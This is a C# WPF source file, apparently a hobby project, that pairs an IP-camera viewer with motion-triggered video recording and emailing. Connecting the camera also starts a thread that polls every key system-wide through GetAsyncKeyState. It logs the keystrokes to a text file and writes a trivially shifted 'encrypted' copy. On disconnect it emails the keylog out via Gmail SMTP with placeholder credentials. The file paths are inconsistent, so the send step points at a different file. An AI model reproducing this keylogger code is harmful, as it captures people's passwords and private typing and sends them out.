using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Ozeki.Camera;
using Ozeki.Media;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Timers;
using System.Threading;
using System.IO;    
using System.Net.Mail;
using System.Net.Mime;
using System.Net;

namespace CameraViewer
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        #region privates
        private OzekiCamera _camera;
        private DrawingImageProvider _provider;
        private MediaConnector _connector;
        private CameraURLBuilderWPF _myCameraURLBuilder;
        private Thread t1;

        private MotionDetector _motionDetector;
        private Image _image;
        private SnapshotHandler _snapshot;

        private MPEG4Recorder _mpeg4Recorder;
        private string _actualFilePath;
        private bool _videoCaptured;
        #endregion
        public MainWindow()
        {
            InitializeComponent();

            _provider = new DrawingImageProvider();
            _connector = new MediaConnector();
            videoViewer.SetImageProvider(_provider);
            t1 = new Thread(StartLogging);

            _snapshot = new SnapshotHandler();
            _motionDetector = new MotionDetector();
            _motionDetector.HighlightMotion = HighlightMotion.Highlight;
            _motionDetector.MotionColor = MotionColor.Red;
            _motionDetector.MotionDetection += _motionDetector_MotionDetection;
          
        }

        #region motion detection
        private void _motionDetector_MotionDetection(object sender, MotionDetectionEvent e)
        {
            if (e.Detection)
            {
                if (_videoCaptured) return;
                InvokeGuiThread(() => live_camera.Background = Brushes.Red);//found detection
                StartVideoCapture();
                _videoCaptured = true;

                var timer = new System.Timers.Timer();
                timer.Elapsed += ElapsedMotion;
                timer.Interval = 10000;
                timer.AutoReset = false;
                timer.Start();
            }
            else
                InvokeGuiThread(() => live_camera.Background = Brushes.Aqua);//ended

                
        }//found movement
        private void ElapsedMotion(object sender, ElapsedEventArgs e)
        {
            var timer = sender as System.Timers.Timer;
            if (timer != null)
            {
                timer.Stop();
                timer.Dispose();
            }

            StopVideoCapture();
        }//record timer
        private void Mpeg4Recorder_MultiplexFinished(object sender, VoIPEventArgs<bool> e)//finished recording
        {
            InvokeGuiThread(() => live_camera.Background = Brushes.Aqua);//completed
            var recorder = sender as MPEG4Recorder;
            _connector.Disconnect(_camera.AudioChannel, recorder.AudioRecorder);
            _connector.Disconnect(_camera.VideoChannel, recorder.VideoRecorder);

            recorder.Dispose();

            if (!_videoCaptured) return;
            SendEmail();
            _videoCaptured = false;
        }

        #endregion

        #region start/stop video capture
        private void StartVideoCapture()
        {
            var date = DateTime.Now.Year + "y-" + DateTime.Now.Month + "m-" + DateTime.Now.Day + "d-" +
                       DateTime.Now.Hour + "h-" + DateTime.Now.Minute + "m-" + DateTime.Now.Second + "s";

            _actualFilePath = date + ".mp4";

            _mpeg4Recorder = new MPEG4Recorder(_actualFilePath);
            _mpeg4Recorder.MultiplexFinished += Mpeg4Recorder_MultiplexFinished;

            _connector.Connect(_camera.AudioChannel, _mpeg4Recorder.AudioRecorder);
            _connector.Connect(_camera.VideoChannel, _mpeg4Recorder.VideoRecorder);
            InvokeGuiThread(() => live_camera.Background = Brushes.Blue);//started
        }//start to recording video file
        private void StopVideoCapture()
        {
            _mpeg4Recorder.Multiplex();
            _connector.Disconnect(_camera.AudioChannel, _mpeg4Recorder.AudioRecorder);
            _connector.Disconnect(_camera.VideoChannel, _mpeg4Recorder.VideoRecorder);
        }//stop recording
        #endregion

        #region camera Stats: disconnect or streaming
        void _camera_CameraStateChanged(object sender, CameraStateEventArgs e)
        {
            InvokeGuiThread(() =>
            {
                if (e.State == CameraState.Streaming)
                    Streaming();

                if (e.State == CameraState.Disconnected)
                    Disconnect();

                stateLabel.Content = e.State.ToString();
            });
        }
        private void Disconnect()
        {
            btn_Connect.IsEnabled = true;
            btn_Disconnect.IsEnabled = false;
        }
        private void Streaming()
        {
            btn_Connect.IsEnabled = false;
            btn_Disconnect.IsEnabled = true;
        }
        #endregion

        #region closeMainWindow
        private void MainWindow_OnClosed(object sender, EventArgs e)
        {
            videoViewer.Dispose();
            videoViewer = null;

            if (_camera != null)
            {
                _connector.Disconnect(_camera.VideoChannel, _provider);
                _connector.Dispose();
                _connector = null;

                _camera.CameraStateChanged -= _camera_CameraStateChanged;
                _camera.Disconnect();
                _camera.Dispose();
                _camera = null;
            }

            _provider.Dispose();
            _provider = null;

            _myCameraURLBuilder.Dispose();
            _myCameraURLBuilder = null;
        }//when mainwindow is closed
        #endregion

        #region Gui Thread
        private void InvokeGuiThread(Action action)
        {
            Dispatcher.BeginInvoke(action);
        }//Dispatcher
        #endregion

        #region Buttons
        private void Connect_Click(object sender, RoutedEventArgs e)
        {
            _connector.Connect(_camera.VideoChannel, _provider);
            _camera.Start();
            videoViewer.Start();
            t1.Start();
            _connector.Connect(_camera.VideoChannel, _motionDetector);
            _motionDetector.Start();


        }//connect the camera and monitor detection.start the thread of the keyloger.
        private void Compose_Click(object sender, RoutedEventArgs e)
        {
            _myCameraURLBuilder = new CameraURLBuilderWPF();
            //open the window there I can choose my camera
            var result = _myCameraURLBuilder.ShowDialog();

            if (result == true)
            {
                if (_camera != null)
                {
                    _camera.Disconnect();
                    videoViewer.Stop();
                }

                //the url of the chosen camera
                _camera = new OzekiCamera(_myCameraURLBuilder.CameraURL);
                _camera.CameraStateChanged += _camera_CameraStateChanged;

                InvokeGuiThread(() =>
                {
                    UrlTextBox.Text = _myCameraURLBuilder.CameraURL;
                });

                Disconnect();
            }
        }//choose the camera and add it to the url field.
        private void Disconnect_Click(object sender, RoutedEventArgs e)
        {
            _connector.Disconnect(_camera.VideoChannel, _provider);
            _camera.Disconnect();
            videoViewer.Stop();
            t1.Abort();
            SendKeyloggerTxt();
        }//disconnect the camera and the keylogger.send keyloger txt to email

        private void button_Stop_Click(object sender, RoutedEventArgs e)
        {
            //_motionDetector.MotionDetection -= _motionDetector_MotionDetection;
            //_motionDetector.Stop();
            InvokeGuiThread(() => live_camera.Background = Brushes.AntiqueWhite);//off
        }//the stop button (remove?)
        private void button_Start_Click(object sender, RoutedEventArgs e)
        {
            //_motionDetector.HighlightMotion = HighlightMotion.Highlight;
            //_motionDetector.MotionColor = MotionColor.Red;
            //_motionDetector.MotionDetection += _motionDetector_MotionDetection;
            //_motionDetector.Start();
            InvokeGuiThread(() => live_camera.Background = Brushes.Aqua);//on 
        }//the start button(remove?)
        #endregion

        #region Keylogger
        public void StartLogging()
        {
            KeysConverter converter = new KeysConverter();
            string s = "";
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {

                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 1 || keyState == -32767)
                    {
                        s = converter.ConvertToString(i);
                        TxtKeylogger(s);
                        Encryption(@"C:\Game\Keylogger.txt");
                        InvokeGuiThread(() =>
                        {
                            Keylogger.Items.Add((Keys)i);
                        });
                        //Console.WriteLine((Keys)i);
                        break;
                    }
                }
            }
        }
        public void TxtKeylogger(string key)
        {
            string path = (@"C:\Game\Keylogger.txt");
            if (!File.Exists(path))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(path))
                {
                    if (key == "RETURN" || key == "Enter")
                        sw.WriteLine(key + " ");
                    else
                        sw.Write(key);
                }
            }
        }
        #endregion

        #region sendEmailes
        private void SendEmail()
        {
            try
            {
                var fromAddress = new MailAddress("youremail@gmail.com", "yourDisplayName");
                var toAddress = new MailAddress("youremail@gmail.com", "yourDisplayName");
                const string fromPassword = "yourEmailPassword";
                const string subject = "Alarm Video";
                const string body = "Motion detected";

                var attachmentFilename = _actualFilePath;
                var attachment = new Attachment(attachmentFilename, MediaTypeNames.Application.Octet);
                if (attachmentFilename != null)
                {
                    ContentDisposition disposition = attachment.ContentDisposition;
                    disposition.CreationDate = File.GetCreationTime(attachmentFilename);
                    disposition.ModificationDate = File.GetLastWriteTime(attachmentFilename);
                    disposition.ReadDate = File.GetLastAccessTime(attachmentFilename);
                    disposition.FileName = System.IO.Path.GetFileName(attachmentFilename);
                    disposition.Size = new FileInfo(attachmentFilename).Length;
                    disposition.DispositionType = DispositionTypeNames.Attachment;
                }

                var smtp = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };

                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = body
                })
                {
                    message.Attachments.Add(attachment);
                    smtp.Send(message);
                    InvokeGuiThread(() => live_camera.Background = Brushes.Green);//send
                    System.Windows.MessageBox.Show("E-mail has been successfully sent");
                }
            }
            catch (Exception exception)
            {
                InvokeGuiThread(() => live_camera.Background = Brushes.Orange);//eror
                System.Windows.MessageBox.Show("Error: " + exception.Message);
            }
        } //camera recorded send
        public static void Encryption(string keyPath)
        {
            string path = (@"C:\Game\Encrypted.txt");
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }
            else
            {

                try
                {   // Open the text file using a stream reader.
                    using (StreamReader sr = new StreamReader(keyPath))
                    {
                        String line = sr.ReadToEnd();
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            for (int i = 0; i < line.Length; i++)
                            {
                                sw.Write(line[i] + 1);
                            }
                        }
                        Console.WriteLine(line);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("The file could not be read:");
                    Console.WriteLine(e.Message);
                }
            }
        }
        private void SendKeyloggerTxt()
        {
            try
            {
                // Fill in with your email credentials!
                var fromAddress = new MailAddress("youremail@gmail.com", "yourDisplayName");
                var toAddress = new MailAddress("youremail@gmail.com", "yourDisplayName");
                const string fromPassword = "yourEmailPassword";
                const string subject = "Keylogger";
                const string body = "User keylogger";

                var attachmentFilename = @"C:\Keylogger.txt";
                var attachment = new Attachment(attachmentFilename, MediaTypeNames.Application.Octet);
                if (attachmentFilename != null)
                {
                    ContentDisposition disposition = attachment.ContentDisposition;
                    disposition.CreationDate = File.GetCreationTime(attachmentFilename);
                    disposition.ModificationDate = File.GetLastWriteTime(attachmentFilename);
                    disposition.ReadDate = File.GetLastAccessTime(attachmentFilename);
                    disposition.FileName = System.IO.Path.GetFileName(attachmentFilename);
                    disposition.Size = new FileInfo(attachmentFilename).Length;
                    disposition.DispositionType = DispositionTypeNames.Attachment;
                }

                var smtp = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };

                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = body
                })
                {
                    message.Attachments.Add(attachment);
                    smtp.Send(message);
                    InvokeGuiThread(() => KeylogGB.Background = Brushes.Green);//send
                    System.Windows.MessageBox.Show("E-mail has been successfully sent");
                }
            }
            catch (Exception exception)
            {
                InvokeGuiThread(() => KeylogGB.Background = Brushes.Red);//eror
                System.Windows.MessageBox.Show("Error: " + exception.Message);
            }
        }
        #endregion

    }
}
